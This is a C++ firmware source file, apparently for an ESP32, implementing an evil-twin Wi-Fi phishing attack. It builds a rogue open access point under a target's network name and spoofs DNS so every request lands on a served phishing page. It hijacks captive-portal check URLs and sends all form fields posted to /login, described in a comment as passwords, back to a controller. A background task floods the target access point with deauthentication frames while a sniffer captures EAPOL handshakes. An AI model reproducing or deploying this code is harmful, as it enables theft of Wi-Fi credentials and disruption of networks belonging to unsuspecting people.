#include "portal.h"
#include "sniffer.h"

namespace {
constexpr size_t HTML_APPEND_MARGIN = 32;
constexpr uint32_t DEAUTH_BURST_PAUSE_MS = 3000;

void addNoCacheHeaders(AsyncWebServerResponse* response) {
    if (!response) return;
    response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    response->addHeader("Pragma", "no-cache");
    response->addHeader("Expires", "0");
}
}  // namespace

// استعملنا const char* عوض String باش نوكلو الذاكرة (RAM)
const char* LOADING_HTML = "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='2'><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0d0f;font-family:sans-serif;color:#eee;flex-direction:column;}.spinner{width:48px;height:48px;border:4px solid #333;border-top-color:#4da6ff;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:16px;}@keyframes spin{to{transform:rotate(360deg);}}p{opacity:0.7;font-size:14px;}</style></head><body><div class='spinner'></div><p>Connecting...</p></body></html>";
const char* SUCCESS_HTML = "<html><body><h2>Connecting...</h2></body></html>";

void PortalManager::begin(BridgeProtocol& proto) {
    _proto = &proto;
}

void PortalManager::setupDNSSpoof() {
    if (!_dnsServer) _dnsServer = new DNSServer();
    _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
}

const char* PortalManager::loadingPlaceholder() const {
    return LOADING_HTML;
}

void PortalManager::setupRoutes() {
    // 1. المسار الرئيسي (/) : يعرض صفحة HTML المخصصة مباشرة
    _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
        if (_proto) {
            JsonDocument ev;
            ev["type"] = "portal_viewed";
            ev["client_ip"] = request->client()->remoteIP().toString();
            _proto->sendEvent("portal_viewed", ev);
        }
        
        if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
            resp->addHeader("Content-Length", String(_htmlLen));
            addNoCacheHeaders(resp);
            request->send(resp);
        } else {
            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
            addNoCacheHeaders(resp);
            request->send(resp);
        }
    });

    // 2. مسار continue (احتياطي)
    _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
        if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
            resp->addHeader("Content-Length", String(_htmlLen));
            addNoCacheHeaders(resp);
            request->send(resp);
        } else {
            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
            addNoCacheHeaders(resp);
            request->send(resp);
        }
    });

    // 3. مسار تسجيل الدخول (استقبال الباسورد) - قناص وخفيف
    _server->on("/login", HTTP_ANY, [this](AsyncWebServerRequest* request) {
        JsonDocument doc;
        doc["type"] = "captive_data";
        doc["ip"] = request->client()->remoteIP().toString();
        doc["timestamp"] = millis();
        
        JsonObject data = doc["data"].to<JsonObject>();
        for (int i = 0; i < request->args(); i++) {
            if (request->argName(i).length() > 0) {
                data[request->argName(i)] = request->arg(i);
            }
        }

        if (_proto) _proto->sendEvent("captive_data", doc);

        // الرد السريع الخفيف باش المتصفح ما يعلقش
        request->send(200, "text/html", SUCCESS_HTML);
    });

    // 4. مسارات طرد طلبات الفحص (تريح الرام بزاف وكتجبر المتصفح يفتح الصفحة)
    _server->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    _server->on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    _server->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    _server->on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    _server->on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    _server->on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });

    // 5. أي طلب آخر
    _server->onNotFound([](AsyncWebServerRequest* request) {
        request->redirect("http://192.168.4.1/");
    });
}

void PortalManager::deauthTaskFn(void* pv) {
    auto* self = (PortalManager*)pv;
    uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7};
    memcpy(frame+10, self->_targetBssid, 6);
    memcpy(frame+16, self->_targetBssid, 6);

    uint16_t seq = 0x0010;
    while (self->_running) {
        for (int i=0; i<10; i++) {
            frame[22] = seq&0xFF; frame[23]=(seq>>8)&0xFF;
            esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
            seq += 0x0010;
            delay(10);
        }
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_BURST_PAUSE_MS));
    }
    vTaskDelete(NULL);
}

bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid, String* error) {
    stop(); 
    WiFi.mode(WIFI_MODE_APSTA);
    delay(100);
    bool apOk = WiFi.softAP(ssid, nullptr, channel);
    if (!apOk) { if (error) *error = "softAP creation failed"; return false; }
    bool cfgOk = WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
    if (!cfgOk) { if (error) *error = "softAP DHCP configuration failed"; return false; }

    wifi_config_t cfg{};
    esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
    if (err == ESP_OK) {
        cfg.ap.channel = channel;
        err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
    }
    if (err != ESP_OK) {
        if (error) { *error = "AP channel configuration failed: "; *error += esp_err_to_name(err); }
        return false;
    }

    err = esp_wifi_start();
    if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) {
        if (error) { *error = "WiFi start failed: "; *error += esp_err_to_name(err); }
        return false;
    }
    delay(300);

    _server = new AsyncWebServer(80);
    setupDNSSpoof();
    setupRoutes();
    _server->begin();

    _running = true;
    if (targetBssid) {
        memcpy(_targetBssid, targetBssid, 6);
        _hasTarget = true;
        Sniffer::instance()->setEapolFilter(true, targetBssid);
        Sniffer::instance()->startFixed(channel);
        xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
    }
    return true;
}

bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast, size_t offset, bool hasOffset) {
    if (data && len > 0) {
        const size_t writeOffset = hasOffset ? offset : _htmlLen;
        if (hasOffset && writeOffset > _htmlLen) return false;
        if (_htmlExpected > 0 && writeOffset + len > _htmlExpected) return false;

        if (writeOffset + len > _htmlCap) {
            const size_t newCap = writeOffset + len + 512;
            uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
            if (!grown) return false;
            _htmlBuffer = grown;
            _htmlCap = newCap;
        }
        if (writeOffset > _htmlLen) memset(_htmlBuffer + _htmlLen, 0, writeOffset - _htmlLen);
        memcpy(_htmlBuffer + writeOffset, data, len);
        if (writeOffset + len > _htmlLen) _htmlLen = writeOffset + len;
        _htmlBuffer[_htmlLen] = '\0';
    }

    if (isLast) {
        if (_htmlBuffer == nullptr) return _htmlExpected == 0;
        const char* tail = (const char*)_htmlBuffer;
        const bool hasClose = (_htmlLen >= 7 && (strncasecmp(tail + _htmlLen - 7, "</html>", 7) == 0));
        if (!hasClose) {
            const char* suffix = "</body></html>";
            const size_t slen = strlen(suffix);
            if (_htmlLen + slen > _htmlCap) {
                const size_t newCap = _htmlLen + slen + 1;
                uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
                if (!grown) return false;
                _htmlBuffer = grown;
                _htmlCap = newCap;
            }
            memcpy(_htmlBuffer + _htmlLen, suffix, slen);
            _htmlLen += slen;
            _htmlBuffer[_htmlLen] = '\0';
        }
        if (_htmlExpected > 0 && _htmlLen < _htmlExpected) return false;
        _htmlComplete = true;
        JsonDocument dbg;
        dbg["type"] = "html_complete";
        dbg["size"] = _htmlLen;
        dbg["expected"] = _htmlExpected;
        if (_proto) _proto->sendEvent("debug", dbg);
    }
    return true;
}

bool PortalManager::resetHtml(size_t expectedSize) {
    const size_t MAX_HTML_SIZE = 24 * 1024;
    const size_t SAFETY_MARGIN = 40 * 1024;
    free(_htmlBuffer);
    _htmlBuffer  = nullptr;
    _htmlLen     = 0;
    _htmlCap     = 0;
    _htmlExpected = 0;
    _htmlComplete = false;

    if (expectedSize == 0) return true;
    if (expectedSize > MAX_HTML_SIZE) return false;
    const size_t freeHeap = ESP.getFreeHeap();
    if (freeHeap < expectedSize + HTML_APPEND_MARGIN + SAFETY_MARGIN) return false;

    const size_t capacity = expectedSize + HTML_APPEND_MARGIN;
    _htmlBuffer = (uint8_t*)malloc(capacity + 1);
    if (!_htmlBuffer) return false;
    _htmlBuffer[0] = '\0';
    _htmlCap = capacity;
    _htmlExpected = expectedSize;
    return true;
}

void PortalManager::update() {
    if (_dnsServer) _dnsServer->processNextRequest();
}

void PortalManager::stop() {
    _running = false;
    _loginAttempts = 0;
    _hasTarget = false;
    if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
    if (_server) { _server->end(); delete _server; _server = nullptr; delay(100); }
    if (_dnsServer) { _dnsServer->stop(); delete _dnsServer; _dnsServer = nullptr; delay(100); }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_APSTA);

    free(_htmlBuffer);
    _htmlBuffer  = nullptr;
    _htmlLen     = 0;
    _htmlCap     = 0;
    _htmlExpected = 0;
    _htmlComplete = false;
}
